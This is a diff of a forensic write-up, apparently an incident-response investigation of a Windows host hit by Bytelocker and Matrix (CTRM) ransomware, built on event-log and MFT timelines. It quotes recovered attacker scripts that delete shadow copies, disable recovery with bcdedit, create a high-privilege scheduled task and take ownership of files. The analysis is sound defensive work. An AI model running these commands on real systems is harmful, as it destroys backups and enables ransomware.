@@ -205,7 +205,7 @@ Date|Time|source|fileType|action|fileName
 ```
 
 
-(Note:  we'll see more later about CRTM )
+(Note:  we'll see more later about CTRM )
 
 
 After extracting the ransom note from the disk, we can get it's content:
@@ -439,8 +439,6 @@ user_special_logon_id4672.csv
 Date|Time|event_code|logon_type|subject_user_name|target_user_name|ip_address|ip_port
 2021-01-07|03:28:22|4672|Administrator|-|-|-|-
 2021-01-07|03:28:23|4672|SYSTEM|-|-|-|-
-
-
 ```
 
 
@@ -451,17 +449,13 @@ We can see that the account "Administrator" was connected using SMB. We can also
 
 
 A new service was created :
-
-
 ```bash
 new_service_id7045.csv
 Date|Time|event_code|account_name|img_path|service_name|start_type
 2021-01-07|03:28:22|7045|LocalSystem|%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat|BTOBTO
 ```
 
-
 Lets breakdown that command line :
-
 
 The first part:
 ```bash
@@ -637,19 +631,12 @@ As we go through the timeline we can see multiple connections from arthur, still
 timeline.csv
 2021-01-07|03:49:07.978986|4672usrSpeLogon|4672|arthur|-|-|-|-
 2021-01-07|03:49:07.979144|4624usrLogon|4624|-|arthur|192.168.88.137|46302|3
-2021-01-07|03:49:13.105779|mft|FILESTAT|file|Creation Time|\ProgramData\Microsoft\Diagnosis\DownloadedSettings\[Citrteam@hotmail.com].1LnNJAKH-WboL7pFq.CTRM
 ```
-
-In the MFT, this file is created : [Citrteam[@]hotmail[.]com].1LnNJAKH-WboL7pFq.CTRM. It match 2 iocs, the first one is "Citrteam[@]hotmail[.]com" and the second one is the file extension : "CRTM. Both those iocs are linked to CRTM ransomware, himself belonging to Matrix ransomware families.
-
-CTRM ransomware encrypts files and renames them. It also creates a ransom note, usually named "CTRM_INFO.rtf" in all folders that contain encrypted files. CTRM renames files by replacing their filenames with the citrteam@xxxx.com email address and random strings, file ext is  ".CTRM".
-
-We have previously identified the ransomware as Bytelocker and now we have evidence of CRTM. Here we only have 1 file name CRTM, it was created and not modified. Maybe it was just a test by the attacker. Furthermore we don't have any evidence of any execution of a binary nor its creation in the MFT.
 
 
 ## Launching the Ransomware
 
-
+### Bytelocker
 After lot of failed connections from Arthur, we get an eventID 4648 and a success RDP connexion with a bytelocker.exe entry in the shimcache:
 
 ```bash
@@ -695,17 +682,40 @@ timeline.csv
 2021-01-07|04:05:58.398303|runKey|Bytelocker: "C:\Users\arthur\AppData\Roaming\{86ff23e9-f09f-4ca4-ae3d-41fe11fbabcd}.exe"
 ```
 
-Later on we spot the creation and execution of this binary : ATXO3fAc.exe.
+### Matrix
+
+The following action are typically used by Matrix ransomwares.
+
+We can spot the creation of multiple scripts, binary and scheduled tasks :
 ```bash
 timeline.csv
+2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|ATXO3fAc.exe
+2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|CEp5f0ji.bat
+2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|M1nLSX9d.bat
+2021-01-07|04:20:51.023841|mft|USNJRNL|N/A|USN_REASON_FILE_CREATE|zTYfgvad.vbs
 2021-01-07|04:20:51.023841|shimcache|ATXO3fAc.exe|C:\Users\Administrator\Documents\ATXO3fAc.exe|e55e5b02ad40e9846a3cd83b00eec225fb98781c6f58a19697bf66a586f77672
+[...]
+2021-01-07|04:20:53.116940|mft|FILESTAT|file|Creation Time|\Users\Administrator\Documents\bad_3F79A31A837D5316.txt
+[...]
+2021-01-07|04:21:13.728579|taskScheduler|106|-|\DSHCA|-|-|-|-|BROCELIANDE\arthur
+2021-01-07|04:21:13.728581|taskScheduler|140|-|\DSHCA|-|-|-|BROCELIANDE\arthur|-
+2021-01-07|04:21:22.952657|taskScheduler|200|-|\DSHCA|-|C:\Windows\SYSTEM32\cmd.exe|-|-|-
+2021-01-07|04:44:43.875135|taskScheduler|201|-|\DSHCA|-|C:\Windows\SYSTEM32\cmd.exe|3221225786|-|-
+
 ```
 
-By searching the md5 of ATXO3fAc64.exe we can find another name from it : VSSDestroy. It is associated with Matrix ransomwares.
+By looking at the MD5 of the file ATXO3fAc.exe, we can see that it is Nthandle.exe from sysinternals.
+It's a legit tool that allow the user to close any handle on a file.
+A Windows file handle is a crucial mechanism that enables programs to interact with files in a structured and secure manner.
 
-It his launched by a bat script :
 ```bash
-root@Sidious:/mnt/vmdk/Users/Administrator/Documents# cat CEp5f0ji.bat
+md5sum ATXO3fAc.exe 
+2f5b509929165fc13ceab9393c3b911d  ATXO3fAc.exe
+```
+
+The binary is linked to the script CEp5f0ji.bat
+
+```bash
 cacls %1 /E /G %USERNAME%:F /C
 takeown /F %1
 set FN="%~nx1"
@@ -713,7 +723,71 @@ cd /d "%~dp0"
 FOR /F "UseBackQ Tokens=3,6 delims=: " %%I IN (`ATXO3fAc.exe -accepteula %FN% -nobanner`) DO (ATXO3fAc.exe -accepteula -c %%J -y -p %%I -nobanner)
 ```
 
-This binary is used to delete all Windows shadow-copies to avoid any restoration of the system pre-attack.
+This script grants the current user full control over a specified file and takes ownership of it.
+Then it use the binary ATXO3fAc.exe (Nthandle.exe) to close any handle related to the file.
+
+**To sum up**:
+
+This script allow the attacker deal with file permission and handles as they could prevent file encryption.
+
+
+The file bad_3F79A31A837D5316.txt contain a list of file and exe, it was probably used to feed the script CEp5f0ji.bat as it needs a fileName and path as an argument :
+
+```bash
+ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Start Menu\Programs\Immersive Control Panel.lnk
+ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\Templates\SettingsLocationTemplate2013.xsd
+ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\AppV\Setup\OfficeIntegrator.ps1
+[...]
+```
+
+Now lets take a look at the scrip zTYfgvad.vbs :
+
+```batch
+Option Explicit
+dim W
+Set W = CreateObject("Wscript.Shell")
+W.Run "cmd.exe /C schtasks /Create /tn DSHCA /tr ""C:\Users\arthur\AppData\Roaming\M1nLSX9d.bat"" /sc minute /mo 5 /RL HIGHEST /F", 0, True
+W.Run "cmd.exe /C schtasks /Run /I /tn DSHCA", 0, False
+```
+This script creates a scheduled task named "DSHCA" that runs the batch file "M1nLSX9d.bat" every 5 minutes with the highest privileges.
+Then, it immediately runs the newly created task.
+
+
+Here is the content of the file : M1nLSX9d.bat 
+
+```batch 
+vssadmin Delete Shadows /All /Quiet
+wmic SHADOWCOPY DELETE
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+del /f /q "C:\Users\arthur\AppData\Roaming\zTYfgvad.vbs"
+SCHTASKS /Delete /TN DSHCA /F
+del /f /q %0
+```
+
+This script will:
+* Completely remove system restore points and shadow copies.
+* Disable Windows Recovery Environment and suppress boot error messages.
+* Delete the file zTYfgvad.vbs we saw above.
+* Delete the DSHCA scheduled task we saw above.
+* Delete itself.
+
+
+In the MFT, a lot of file are created/modified and have the same naming patern : 
+```bash
+2021-01-07|04:21:10.148461|mft|FILESTAT|file|Metadata Modification Time|\Program Files (x86)\CMAK\Support\Previous releases\[Citrteam@hotmail.com].DvXRC02y-8Yeneq3z.CTRM
+2021-01-07|04:21:10.148461|mft|FILESTAT|file|Metadata Modification Time|\Program Files\VMware\VMware Tools\VMware VGAuth\[Citrteam@hotmail.com].kxAL47t3-yygBS2r4.CTRM
+2021-01-07|04:21:10.148461|mft|FILESTAT|file|Metadata Modification Time|\Program Files\VMware\VMware Tools\VMware VGAuth\schemas\[Citrteam@hotmail.com].COdAClxC-xrdul1K7.CTRM
+2021-01-07|04:21:10.195451|mft|FILESTAT|file|Metadata Modification Time|\System Volume Information\DFSR\database_665A_45F5_5A45_C313\[Citrteam@hotmail.com].Efm1dxRl-Z6nxgXnG.CTRM
+```
+
+It match 2 iocs related to Matrix ransomware famillies:
+The name contains "Citrteam[@]hotmail[.]com"
+The file extension is  : "CTRM.
+
+By all means, It looks like a 2nd ransomware has been launched on the machine.
+
+but why ? i have no idea.
 
 
 ## Stealing datas
@@ -732,33 +806,25 @@ It's a technique that is typically used to steal credentials from an AD database
 The file "NWcurdcz.exe" wasn't on the disk anymore so i couldn't investigate any further.
 
 
-On the disk I could find the file bad_3F79A31A837D5316.txt which looks like the result of a recon command. It contain a list of file and exe:
-
-```bash
-ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Start Menu\Programs\Immersive Control Panel.lnk
-ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\Templates\SettingsLocationTemplate2013.xsd
-ATO_OPER: C:\ProgramData\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\AppV\Setup\OfficeIntegrator.ps1
-[...]
-```
-
-by looking in the MFT we can see that it was created around 4:20 am :
-```bash
-mft.csv
-Date|Time|source|fileType|action|fileName
-2021-01-07|04:20:53.116940|mft|FILESTAT|file|Creation Time|\Users\Administrator\Documents\bad_3F79A31A837D5316.txt
-2021-01-07|04:44:51.151497|mft|FILESTAT|file|Content Modification Time|\Users\Administrator\Documents\bad_3F79A31A837D5316.txt
-2021-01-07|04:44:51.151497|mft|FILESTAT|file|Last Access Time|\Users\Administrator\Documents\bad_3F79A31A837D5316.txt
-2021-01-07|04:44:51.151497|mft|FILESTAT|file|Metadata Modification Time|\Users\Administrator\Documents\bad_3F79A31A837D5316.txt
-```
-
-
-it might be a way for the attacker to know if the ransomware has encrypted the files successfully.
-
-
 I can't find any other following action from the attacker.
 
 
-It's not that irrelevant as he pwnd all the infrastructure, successfully executed the ransomware, dropped a remote access tool and stole a lot of sensitive information.
+It's not that irrelevant as he pwnd all the infrastructure, successfully executed the ransomware, dropped a remote access tool and stole a lot of sensitives informations.
+
+
+## Conclusion 
+
+With this investigation we could follow every step of the attack on this machine.
+We can sum up the attack methodologie like so:
+
+1. Connect from another machine with a privileged user
+2. Disable the antivirus
+3. Drop backdoor and remot access tool (cobalt strike)
+4. Use Mimikatz to get higher user privileges or to anchor deeper within the system
+5. Use scripts to make surе that all file can be encrypted without problem
+6. Use script to destroy every backup or SHADOWCOPY
+7. Execute ransomware
+8. Steal datas using ActiveDirectorySync.
 
 
 
